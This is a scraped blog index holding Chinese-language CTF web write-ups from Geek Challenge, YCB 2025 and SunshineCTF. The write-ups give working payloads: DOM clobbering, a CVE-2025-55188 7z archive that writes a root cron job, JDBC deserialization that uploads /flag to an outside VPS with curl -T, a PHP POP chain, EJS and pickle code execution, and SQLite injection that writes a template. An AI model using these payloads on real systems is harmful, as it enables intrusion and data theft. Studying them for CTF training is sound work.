PDF Viewer \u0026lt;script\u0026gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\u0026#39;GET\u0026#39;,\u0026#39;file:///etc/passwd\u0026#39;);x.send();\u0026lt;/script\u0026gt; 有个弱口令用户，先尝试直接读 /proc/self/environ：\n爆破管理员口令：\n路在脚下_revenge 同路在脚下\nXross The Doom package.json：\n{ \u0026#34;name\u0026#34;: \u0026#34;xross\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;oh, no!\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;server.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;node server.js\u0026#34;, \u0026#34;dev\u0026#34;: \u0026#34;NODE_ENV=development node server.js\u0026#34;, \u0026#34;solve\u0026#34;: \u0026#34;node solve.js\u0026#34;, \u0026#34;bot\u0026#34;: \u0026#34;node bot.js\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;cookie-parser\u0026#34;: \u0026#34;^1.4.7\u0026#34;, \u0026#34;express\u0026#34;: \u0026#34;^5.1.0\u0026#34;, \u0026#34;nanoid\u0026#34;: \u0026#34;^5.1.6\u0026#34;, \u0026#34;dompurify\u0026#34;: \u0026#34;^3.3.0\u0026#34;, \u0026#34;jsdom\u0026#34;: \u0026#34;^27.1.0\u0026#34;, \u0026#34;puppeteer\u0026#34;: \u0026#34;^24.29.0\u0026#34; }, \u0026#34;devDependencies\u0026#34;: {} } dompurify是最新版本，不存在bypass的手段，考虑 DOM Clobbering\nadmin.js：\n... const auto = asBool(window.AUTO_SHARE); const path = asPath(window.CONFIG_PATH); const includeCookie = asBool(window.CONFIG_COOKIE_DEBUG); function buildTarget(base, sub) { const parts = (base + \u0026#39;/\u0026#39; + (sub || \u0026#39;\u0026#39;)).split(\u0026#39;/\u0026#39;); const stack = []; for (const seg of parts) { if (seg === \u0026#39;..\u0026#39;) { if (stack.length) stack.pop(); } else if (seg \u0026amp;\u0026amp; seg !== \u0026#39;.\u0026#39;) { stack.push(seg); } } return \u0026#39;/\u0026#39; + stack.join(\u0026#39;/\u0026#39;); } if (auto) { const target = buildTarget(\u0026#39;/analytics\u0026#39;, path); const qs = new URLSearchParams({ id, ua: navigator.userAgent }); if (includeCookie) { qs.set(\u0026#39;c\u0026#39;, document.cookie); } fetch(target + \u0026#39;?\u0026#39; + qs.toString()).catch(() =\u0026gt; {}); } 只要能设置 auto 和 includeCookie 为true，最后fetch /log就可以在 /logs 中记录含有FLAG的 cookie\npayload：\n\u0026lt;a id=AUTO_SHARE\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;a id=CONFIG_COOKIE_DEBUG\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;form id=CONFIG_PATH action=../../log\u0026gt;\u0026lt;/form\u0026gt; 在网络中找到对应id，让bot去访问对应id内容，执行admin.js时因为构造好的CONFIG_PATH导致拼接时目录穿越，后续会自动去fetch /log\n最后访问/logs：\n77777 time task app.py：\nimport os from flask import Flask, jsonify, request import subprocess app = Flask(__name__) UPLOAD_DIR=\u0026#34;./uploads\u0026#34; os.makedirs(UPLOAD_DIR, exist_ok=True) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return \u0026#34;Hello World\u0026#34; @app.route(\u0026#34;/upload\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def upload(): if \u0026#39;file\u0026#39; not in request.files: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;No file part\u0026#34;}), 400 file = request.files[\u0026#39;file\u0026#39;] if file.filename == \u0026#39;\u0026#39;: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;No selected file\u0026#34;}), 400 sanitizeFilename=file.filename.replace(\u0026#34;..\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;/\u0026#34;,\u0026#34;\u0026#34;) ext=sanitizeFilename.split(\u0026#34;.\u0026#34;)[-1] if ext != \u0026#34;7z\u0026#34;: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Only .7z files are allowed\u0026#34;}), 400 filepath = os.path.join(UPLOAD_DIR, file.filename) file.save(filepath) ret=subprocess.run([\u0026#34;/tmp/7zz\u0026#34;, \u0026#34;x\u0026#34;, filepath],shell=False,stdout=subprocess.PIPE,stderr=subprocess.PIPE) if ret.returncode != 0: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Failed to extract .7z file\u0026#34;, \u0026#34;detail\u0026#34;: ret.stderr.decode()}), 500 return jsonify({\u0026#34;status\u0026#34;: \u0026#34;success\u0026#34;, \u0026#34;filename\u0026#34;: file.filename}) @app.route(\u0026#34;/listfiles\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def list_files(): dir=request.args.get(\u0026#34;dir\u0026#34;, \u0026#34;./uploads\u0026#34;) files = os.listdir(dir) return jsonify({\u0026#34;files\u0026#34;: files}) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=3000, debug=False) 执行 os.path.join 时没有使用过滤后的 sanitizeFilename，看上去有目录穿越的问题，但是前面有对于扩展名为7z的限制，所以实际上难以利用，最多是把7z后缀名的文件保存到其他目录\n一开始想到软链接，但是7z解压默认把解压目录当作根目录，即/app，所有普通的软链接比如指向/tmp在这样的环境下被解压后都会指向/app/tmp，并且如果链接文件名带有目录穿越的内容，如 ../ 都会触发报错 ERROR: Dangerous link path was ignored\n从Dockerfile能找到其他信息：\nFROM python:3.11-slim # Install cron and 7zip utilities required by the app RUN apt-get update \\ \u0026amp;\u0026amp; apt-get install -y --no-install-recommends cron wget xz-utils\\ \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/* WORKDIR /app RUN cd /tmp \u0026amp;\u0026amp; \\ wget https://www.7-zip.org/a/7z2500-linux-x64.tar.xz \\ \u0026amp;\u0026amp; tar -xvf 7z2500-linux-x64.tar.xz # Copy the application code COPY app/ ./ COPY docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh RUN chmod +x /usr/local/bin/docker-entrypoint.sh # Install Python dependencies RUN pip install --no-cache-dir flask EXPOSE 3000 ENTRYPOINT [\u0026#34;/usr/local/bin/docker-entrypoint.sh\u0026#34;] 7z特意指定了一个版本25.00，搜了搜最近的漏洞，找到CVE-2025-55188，7z版本小于25.01都存在软链接处理问题，对于精心构造的恶意软链接处理时会导致目录穿越\ndocker-entrypoint.sh：\n#!/bin/sh set -e if [ \u0026#34;$FLAG\u0026#34; ]; then INSERT_FLAG=\u0026#34;$FLAG\u0026#34; export FLAG=no_FLAG FLAG=no_FLAG else INSERT_FLAG=\u0026#34;flag{TEST_Dynamic_FLAG}\u0026#34; fi echo $INSERT_FLAG | tee /flag /usr/sbin/cron exec python app.py 结合题目名称以及 docker-entrypoint.sh 脚本里启动了cron的守护进程，考虑通过定时任务来实现rce\ngithub上的poc：https://github.com/lunbun/CVE-2025-55188/blob/main/poc_extraction_root/make_arb_write_7z.sh\n详细的漏洞分析：https://lunbun.dev/blog/cve-2025-55188/\n对poc脚本稍作修改，本来想直接覆盖文件 /etc/crontab，但是会失败，后面通过写入 /etc/cron.d 目录进行定时任务达到同样的效果：\n#!/bin/bash # # Writes to ../file.txt on extraction. # # Works on Linux only. # olddir=\u0026#34;$(pwd)\u0026#34; tempdir=\u0026#34;$(mktemp -d)\u0026#34; cd \u0026#34;$tempdir\u0026#34; mkdir -p a/b ln -s /a a/b/link 7zz a arb_write.7z a/b/link -snl ln -s a/b/link/../../ link 7zz a arb_write.7z link -snl rm link mkdir link mkdir link/etc mkdir link/etc/cron.d echo \u0026#34;* * * * * root cp /flag /app/uploads/flag_\\$(cat /flag)\u0026#34; \u0026gt; link/etc/cron.d/exploit 7zz a arb_write.7z link/etc/cron.d/exploit cp arb_write.7z \u0026#34;$olddir\u0026#34; cd \u0026#34;$olddir\u0026#34; rm -r \u0026#34;$tempdir\u0026#34; 上传文件后等待1分钟，就可以看到 /uploads 目录下有带有 /flag 文件内容的文件被写入了\ncurl -X POST \u0026#39;http://019aaf50-29b9-78e3-bae1-2bc9d2bc9740.geek.ctfplus.cn/upload\u0026#39; -F \u0026#39;file=@arb_write.7z\u0026#39; ezjdbc jdbcController类：\npackage ctf.geekchallenge.ezjdbc.demos.web; import java.sql.DriverManager; import java.sql.SQLException; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; @RestController /* loaded from: ezjdbc-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/ctf/geekchallenge/ezjdbc/demos/web/jdbcController.class */ public class jdbcController { static String CLASS_NAME = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; @GetMapping({\u0026#34;/\u0026#34;}) public String index() { return \u0026#34;Hello Jdbc\u0026#34;; } @GetMapping({\u0026#34;/connect\u0026#34;}) public String connect(@RequestParam(\u0026#34;url\u0026#34;) String url, @RequestParam(\u0026#34;name\u0026#34;) String name, @RequestParam(\u0026#34;pass\u0026#34;) String pass) throws SQLException { DriverManager.getConnection(url, name, pass); return url; } } java 1.8，mysql 8.0.19，Commons-Collections 3.2.1：\nurl name都可控，打jdbc反序列化，利用工具创建 fake mysql server：https://github.com/4ra1n/mysql-fake-server/tree/master\ncurl外带flag，但是 $() 和反引号不知道为什么都不行，考虑 curl -T 上传文件 /flag到vps：\npayload：\n/connect?url=jdbc:mysql://121.40.46.63:3308/test?autoDeserialize=true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;name=base64ZGVzZXJfQ0MzMV9jdXJsIC1UIC9mbGFnIGh0dHA6Ly8xMjEuNDAuNDYuNjM6MjMzMy8=\u0026amp;pass=1 vps上搞个支持PUT方法的python http server：\nimport http.server import socketserver import os import shutil PORT = 2333 # 更改端口 class PutHandler(http.server.SimpleHTTPRequestHandler): \u0026#34;\u0026#34;\u0026#34; 自定义 HTTP 请求处理程序，继承 SimpleHTTPRequestHandler 并实现 do_PUT 方法。 \u0026#34;\u0026#34;\u0026#34; def do_PUT(self): \u0026#34;\u0026#34;\u0026#34;处理 PUT 请求，用于文件上传/替换\u0026#34;\u0026#34;\u0026#34; # 确定目标文件路径 (确保路径安全，避免目录穿越) filename = os.path.basename(self.path) if not filename: self.send_error(400, \u0026#34;Bad Request: No filename provided\u0026#34;) return file_path = os.path.join(os.getcwd(), filename) # 检查文件是否存在，以确定返回状态码 (200 OK 或 201 Created) if os.path.exists(file_path): response_code = 200 # 资源已存在，表示成功修改 else: response_code = 201 # 资源是新建的 try: # 1. 读取请求体中的数据 length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) # 2. 打开目标文件并写入数据 with open(file_path, \u0026#39;wb\u0026#39;) as fout: # 使用 shutil.copyfileobj 来高效地复制数据流 shutil.copyfileobj(self.rfile, fout, length) # 3. 发送成功响应 self.send_response(response_code) self.end_headers() self.wfile.write(f\u0026#34;File \u0026#39;{filename}\u0026#39; uploaded/updated successfully.\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) except Exception as e: self.send_error(500, f\u0026#34;Internal Server Error: {e}\u0026#34;) # 可选：您也可以在这里实现 do_DELETE 等其他方法 # 启动服务器 with socketserver.TCPServer((\u0026#34;\u0026#34;, PORT), PutHandler) as httpd: print(f\u0026#34;Serving at port {PORT}\u0026#34;) print(f\u0026#34;Current directory: {os.getcwd()}\u0026#34;) print(\u0026#34;Ready to receive PUT requests...\u0026#34;) httpd.serve_forever() vps换成jdk1.8，启动cli版本：\njava -jar fake-mysql-cli-0.0.4.jar ","permalink":"https://blog.w8nn9z.top/posts/ctf/geekchallenge-16th-web-writeup/","summary":"","title":"第十六届极客大挑战 WEB Writeup"},{"content":"ez_unserialize index.php：\n\u0026lt;?php error_reporting(0); highlight_file(__FILE__); class A { public $first; public $step; public $next; public function start() { echo $this-\u0026gt;next; } } class E { private $you; public $found; private $secret = \u0026#34;admin123\u0026#34;; public function __get($name){ if($name === \u0026#34;secret\u0026#34;) { echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$name.\u0026#34; maybe is here!\u0026lt;/br\u0026gt;\u0026#34;; $this-\u0026gt;found-\u0026gt;check(); } } } class F { public $fifth; public $step; public $finalstep; // u public function check() { if(preg_match(\u0026#34;/U/\u0026#34;,$this-\u0026gt;finalstep)) { echo \u0026#34;仔细想想！\u0026#34;; } else { $this-\u0026gt;step = new $this-\u0026gt;finalstep(); ($this-\u0026gt;step)(); } } } class H { public $who; public $are; public $you; public function __construct() { $this-\u0026gt;you = \u0026#34;nobody\u0026#34;; } public function __destruct() { $this-\u0026gt;who-\u0026gt;start(); } } class N { public $congratulation; public $yougotit; public function __call(string $func_name, array $args) { return call_user_func($func_name,$args[0]); } } class U { public $almost; public $there; public $cmd; public function __construct() { $this-\u0026gt;there = new N(); $this-\u0026gt;cmd = $_POST[\u0026#39;cmd\u0026#39;]; } public function __invoke() { return $this-\u0026gt;there-\u0026gt;system($this-\u0026gt;cmd); } } class V { public $good; public $keep; public $dowhat; public $go; public function __toString() { $abc = $this-\u0026gt;dowhat; $this-\u0026gt;go-\u0026gt;$abc; return \u0026#34;\u0026lt;br\u0026gt;Win!!!\u0026lt;/br\u0026gt;\u0026#34;; } } unserialize($_POST[\u0026#39;payload\u0026#39;]); 入口点位于 H.__destruct ，出口点位于 U.__invoke ，可以从后往前构造链子\n当尝试以调用函数的方式调用一个对象时触发 __invoke 方法，所以 F.check -\u0026gt; U.__invoke，利用php初始化类不区分大小写的特性绕过 preg_match(\u0026quot;/U/\u0026quot;,$this-\u0026gt;finalstep) ，将finalstep置为小写u\n绕过这一个点后，后续很自然的能找到 E.__get -\u0026gt; F.check， 访问不可访问或未定义的属性值时会触发 __get 方法，所以 V.__toString -\u0026gt; E.__get ，而当反序列化后的对象被输出时会触发 __toSring 方法，因此 A.start -\u0026gt; V.__toString，最后 H.__destruct -\u0026gt; A.start 即可完成整条链的构造：\nH.__destruct -\u0026gt; A.start -\u0026gt; V.__toString -\u0026gt; E.__get -\u0026gt; F.check -\u0026gt; U.__invoke 完整exp：\n\u0026lt;?php class A { public $first; public $step; public $next; public function start() { echo $this-\u0026gt;next; } } class E { private $you; public $found; private $secret = \u0026#34;admin123\u0026#34;; public function __get($name){ if($name === \u0026#34;secret\u0026#34;) { echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$name.\u0026#34; maybe is here!\u0026lt;/br\u0026gt;\u0026#34;; $this-\u0026gt;found-\u0026gt;check(); } } } class F { public $fifth; public $step; public $finalstep; // u public function check() { if(preg_match(\u0026#34;/U/\u0026#34;,$this-\u0026gt;finalstep)) { echo \u0026#34;仔细想想！\u0026#34;; } else { $this-\u0026gt;step = new $this-\u0026gt;finalstep(); ($this-\u0026gt;step)(); } } } class H { public $who; public $are; public $you; public function __construct() { $this-\u0026gt;you = \u0026#34;nobody\u0026#34;; } public function __destruct() { $this-\u0026gt;who-\u0026gt;start(); } } class N { public $congratulation; public $yougotit; public function __call(string $func_name, array $args) { return call_user_func($func_name,$args[0]); } } class U { public $almost; public $there; public $cmd; public function __construct() { $this-\u0026gt;there = new N(); $this-\u0026gt;cmd = $_POST[\u0026#39;cmd\u0026#39;]; } public function __invoke() { return $this-\u0026gt;there-\u0026gt;system($this-\u0026gt;cmd); } } class V { public $good; public $keep; public $dowhat; public $go; public function __toString() { $abc = $this-\u0026gt;dowhat; $this-\u0026gt;go-\u0026gt;$abc; return \u0026#34;\u0026lt;br\u0026gt;Win!!!\u0026lt;/br\u0026gt;\u0026#34;; } } $f = new F(); $f-\u0026gt;finalstep = \u0026#39;u\u0026#39;; $e = new E(); $e-\u0026gt;found = $f; $v = new V(); $v-\u0026gt;dowhat = \u0026#39;secret\u0026#39;; $v-\u0026gt;go = $e; $a = new A(); $a-\u0026gt;next = $v; $h = new H(); $h-\u0026gt;who = $a; echo urlencode(serialize($h)); staticNodeService App.js：\nconst express = require(\u0026#39;express\u0026#39;); const ejs = require(\u0026#39;ejs\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const app = express(); const PORT = parseInt(process.env.PORT) || 3000; app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.use(express.json({ limit: \u0026#39;1mb\u0026#39; })); const STATIC_DIR = path.join(__dirname, \u0026#39;/\u0026#39;); // serve index for better viewing function serveIndex(req, res) { var templ = req.query.templ || \u0026#39;index\u0026#39;; var lsPath = path.join(__dirname, req.path); try { res.render(templ, { filenames: fs.readdirSync(lsPath), path: req.path }); } catch (e) { console.log(e); res.status(500).send(\u0026#39;Error rendering page\u0026#39;); } } // static serve for simply view/download app.use(express.static(STATIC_DIR)); // Security middleware app.use((req, res, next) =\u0026gt; { if (typeof req.path !== \u0026#39;string\u0026#39; || (typeof req.query.templ !== \u0026#39;string\u0026#39; \u0026amp;\u0026amp; typeof req.query.templ !== \u0026#39;undefined\u0026#39;) ) res.status(500).send(\u0026#39;Error parsing path\u0026#39;); else if (/js$|\\.\\./i.test(req.path)) res.status(403).send(\u0026#39;Denied filename\u0026#39;); else next(); }) // logic middleware app.use((req, res, next) =\u0026gt; { if (req.path.endsWith(\u0026#39;/\u0026#39;)) serveIndex(req, res); else next(); }) // Upload operation handler app.put(\u0026#39;/*\u0026#39;, (req, res) =\u0026gt; { const filePath = path.join(STATIC_DIR, req.path); if (fs.existsSync(filePath)) { return res.status(500).send(\u0026#39;File already exists\u0026#39;); } fs.writeFile(filePath, Buffer.from(req.body.content, \u0026#39;base64\u0026#39;), (err) =\u0026gt; { if (err) { return res.status(500).send(\u0026#39;Error writing file\u0026#39;); } res.status(201).send(\u0026#39;File created/updated\u0026#39;); }); }); // Server start app.listen(PORT, () =\u0026gt; { console.log(`Static server is running on http://localhost:${PORT}`); }); 默认使用 index.ejs 作为模板进行渲染，STATIC_DIR 设置 /App 为根目录，对参数 templ 无任何限制，考虑上传ejs文件命令执行\n上传文件 readflag.ejs/. 可以同时绕过 req.path.endsWith('/') 以及 else if (/js$|\\.\\./i.test(req.path)) ，文件内容进行base64编码：\n\u0026lt;%- global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;/readflag\u0026#39;) %\u0026gt;\rPCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPg== 传参 ?templ=../readflag 来渲染 readflag.ejs执行/readflag获取flag：\nezBlog 提示用访客账号登录，猜测 guest/guest 登录成功，利用Token验证身份，Token是pickle序列化数据，一开始尝试将其中is_admin的值从False改为True，即0x89改为0x88，发现能以管理员账户登录，后续打SSTI发现失败：\n考虑到题目环境使用Token来鉴权，可能是将Token直接反序列化了，打 before_request 内存马：\ncbuiltins\reval\r(S\u0026#39;app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(\\\u0026#39;os\\\u0026#39;).popen(request.args.get(\\\u0026#39;cmd\\\u0026#39;)).read())\u0026#39;\rtR. Ezsingin /login存在sql注入，获取Admin用户connect.sid：\nPOST /login HTTP/1.1\rHost: 45.40.247.139:30096\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rConnection: keep-alive\rUpgrade-Insecure-Requests: 1\rIf-None-Match: W/\u0026#34;30c-DHNVxa0VphnTYJIjy4EiUOx4CDM\u0026#34;\rPriority: u=0, i\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 32\rusername=Admin\u0026#34;)+--+q\u0026amp;password=1 /download存在文件读取：\nGET /download/?filename=../app.js HTTP/1.1\rHost: 45.40.247.139:30096\rAccept-Language: zh-CN,zh;q=0.9\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\rReferer: http://45.40.247.139:30096/\rAccept-Encoding: gzip, deflate, br\rCookie: connect.sid=s%3ArQORBzH5x3cMktwmh4bOVtqMfb4WblLh.G08Vr5WzTRGs3cu7MA5ssx%2Fkcg1HCxCOJ6ymIreM5nc\rConnection: keep-alive app.js：\nconst express = require(\u0026#39;express\u0026#39;); const session = require(\u0026#39;express-session\u0026#39;); const sqlite3 = require(\u0026#39;sqlite3\u0026#39;).verbose(); const path = require(\u0026#39;path\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const app = express(); const db = new sqlite3.Database(\u0026#39;./db.sqlite\u0026#39;); /* FLAG in /fla4444444aaaaaagg.txt */ app.use(express.urlencoded({ extended: true })); app.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); app.use(session({ secret: \u0026#39;welcometoycb2025\u0026#39;, resave: false, saveUninitialized: true, cookie: { secure: false } })); app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); const checkPermission = (req, res, next) =\u0026gt; { if (req.path === \u0026#39;/login\u0026#39; || req.path === \u0026#39;/register\u0026#39;) return next(); if (!req.session.user) return res.redirect(\u0026#39;/login\u0026#39;); if (!req.session.user.isAdmin) return res.status(403).send(\u0026#39;无权限访问\u0026#39;); next(); }; app.use(checkPermission); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { fs.readdir(path.join(__dirname, \u0026#39;documents\u0026#39;), (err, files) =\u0026gt; { if (err) { console.error(\u0026#39;读取目录时发生错误:\u0026#39;, err); return res.status(500).send(\u0026#39;目录读取失败\u0026#39;); } req.session.files = files; res.render(\u0026#39;files\u0026#39;, { files, user: req.session.user }); }); }); app.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;login\u0026#39;); }); app.get(\u0026#39;/register\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;register\u0026#39;); }); app.get(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { if (!req.session.user) return res.redirect(\u0026#39;/login\u0026#39;); res.render(\u0026#39;upload\u0026#39;, { user: req.session.user }); //todoing }); app.get(\u0026#39;/logout\u0026#39;, (req, res) =\u0026gt; { req.session.destroy(err =\u0026gt; { if (err) { console.error(\u0026#39;退出时发生错误:\u0026#39;, err); return res.status(500).send(\u0026#39;退出失败\u0026#39;); } res.redirect(\u0026#39;/login\u0026#39;); }); }); app.post(\u0026#39;/login\u0026#39;, async (req, res) =\u0026gt; { const username = req.body.username; const password = req.body.password; const sql = `SELECT * FROM users WHERE (username = \u0026#34;${username}\u0026#34;) AND password = (\u0026#34;${password}\u0026#34;)`; db.get(sql,async (err, user) =\u0026gt; { if (!user) { return res.status(401).send(\u0026#39;账号密码出错！！\u0026#39;); } req.session.user = { id: user.id, username: user.username, isAdmin: user.is_admin }; res.redirect(\u0026#39;/\u0026#39;); }); }); app.post(\u0026#39;/register\u0026#39;, (req, res) =\u0026gt; { const { username, password, confirmPassword } = req.body; if (password !== confirmPassword) { return res.status(400).send(\u0026#39;两次输入的密码不一致\u0026#39;); } db.exec(`INSERT INTO users (username, password) VALUES (\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;)`, function(err) { if (err) { console.error(\u0026#39;注册失败:\u0026#39;, err); return res.status(500).send(\u0026#39;注册失败，用户名可能已存在\u0026#39;); } res.redirect(\u0026#39;/login\u0026#39;); }); }); app.get(\u0026#39;/download\u0026#39;, (req, res) =\u0026gt; { if (!req.session.user) return res.redirect(\u0026#39;/login\u0026#39;); const filename = req.query.filename; if (filename.startsWith(\u0026#39;/\u0026#39;)||filename.startsWith(\u0026#39;./\u0026#39;)) { return res.status(400).send(\u0026#39;WAF\u0026#39;); } if (filename.includes(\u0026#39;../../\u0026#39;)||filename.includes(\u0026#39;.././\u0026#39;)||filename.includes(\u0026#39;f\u0026#39;)||filename.includes(\u0026#39;//\u0026#39;)) { return res.status(400).send(\u0026#39;WAF\u0026#39;); } if (!filename || path.isAbsolute(filename) ) { return res.status(400).send(\u0026#39;无效文件名\u0026#39;); } const filePath = path.join(__dirname, \u0026#39;documents\u0026#39;, filename); if (fs.existsSync(filePath)) { res.download(filePath); } else { res.status(404).send(\u0026#39;文件不存在\u0026#39;); } }); const PORT = 80; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); }); /register使用了 db.exec ，存在堆叠注入，同时观察到使用了ejs，并且/upload下不存在upload.ejs，尝试sqlite写入 upload.ejs：\ntest\u0026#39;); ATTACH DATABASE \u0026#39;/app/views/upload.ejs\u0026#39; AS temp; CREATE TABLE temp.pwn (data, TEXT); INSERT INTO temp.pwn (data) VALUES (\u0026#39;\u0026lt;%= include(\u0026#34;/fla4444444aaaaaagg.txt\u0026#34;) %\u0026gt;\u0026#39;); -- (\u0026#39; 访问/upload获取flag：\n","permalink":"https://blog.w8nn9z.top/posts/ctf/ycb-2025-web-writeup/","summary":"","title":"羊城杯 2025 WEB Writeup"},{"content":"Lunar Auth robots.txt：\n# tired of these annoying search engine bots scraping the admin panel page logins:\rDisallow: /admin /admin有一段前端登录验证：\n\u0026lt;script\u0026gt; /* To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption (\u0026#34;encryption\u0026#34; 💀) on the client side. TODO: implement proper encryption. */ const real_username = atob(\u0026#34;YWxpbXVoYW1tYWRzZWN1cmVk\u0026#34;); const real_passwd = atob(\u0026#34;UzNjdXI0X1BAJCR3MFJEIQ==\u0026#34;); document.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;, () =\u0026gt; { const form = document.querySelector(\u0026#34;form\u0026#34;); function handleSubmit(evt) { evt.preventDefault(); const username = form.elements[\u0026#34;username\u0026#34;].value; const password = form.elements[\u0026#34;password\u0026#34;].value; if (username === real_username \u0026amp;\u0026amp; password === real_passwd) { // remove this handler and allow form submission form.removeEventListener(\u0026#34;submit\u0026#34;, handleSubmit); form.submit(); } else { alert(\u0026#34;[ Invalid credentials ]\u0026#34;); } } form.addEventListener(\u0026#34;submit\u0026#34;, handleSubmit); }); \u0026lt;/script\u0026gt; 解码base64得到username和password分别为alimuhammadsecured和S3cur4_P@$$w0RD!，登录拿到flag：\nMission Control — FLAG\rAuthorized access confirmed. Presenting mission artifact:\rsun{cl1ent_s1d3_auth_1s_N3V3R_a_g00d_1d3A_983765367890393232} Intergalactic Webhook Service app.py：\nimport threading from flask import Flask, request, abort, render_template, jsonify import requests from urllib.parse import urlparse from http.server import BaseHTTPRequestHandler, HTTPServer import socket import ipaddress import uuid def load_flag(): with open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: return f.read().strip() FLAG = load_flag() class FlagHandler(BaseHTTPRequestHandler): def do_POST(self): if self.path == \u0026#39;/flag\u0026#39;: self.send_response(200) self.send_header(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/plain\u0026#39;) self.end_headers() self.wfile.write(FLAG.encode()) else: self.send_response(404) self.end_headers() threading.Thread(target=lambda: HTTPServer((\u0026#39;127.0.0.1\u0026#39;, 5001), FlagHandler).serve_forever(), daemon=True).start() app = Flask(__name__) registered_webhooks = {} def create_app(): return app @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) def is_ip_allowed(url): parsed = urlparse(url) host = parsed.hostname or \u0026#39;\u0026#39; try: ip = socket.gethostbyname(host) except Exception: return False, f\u0026#39;Could not resolve host\u0026#39; ip_obj = ipaddress.ip_address(ip) if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved: return False, f\u0026#39;IP \u0026#34;{ip}\u0026#34; not allowed\u0026#39; return True, None @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def register_webhook(): url = request.form.get(\u0026#39;url\u0026#39;) if not url: abort(400, \u0026#39;Missing url parameter\u0026#39;) allowed, reason = is_ip_allowed(url) if not allowed: return reason, 400 webhook_id = str(uuid.uuid4()) registered_webhooks[webhook_id] = url return jsonify({\u0026#39;status\u0026#39;: \u0026#39;registered\u0026#39;, \u0026#39;url\u0026#39;: url, \u0026#39;id\u0026#39;: webhook_id}), 200 @app.route(\u0026#39;/trigger\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def trigger_webhook(): webhook_id = request.form.get(\u0026#39;id\u0026#39;) if not webhook_id: abort(400, \u0026#39;Missing webhook id\u0026#39;) url = registered_webhooks.get(webhook_id) if not url: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;Webhook not found\u0026#39;}), 404 allowed, reason = is_ip_allowed(url) if not allowed: return jsonify({\u0026#39;error\u0026#39;: reason}), 400 try: resp = requests.post(url, timeout=5, allow_redirects=False) return jsonify({\u0026#39;url\u0026#39;: url, \u0026#39;status\u0026#39;: resp.status_code, 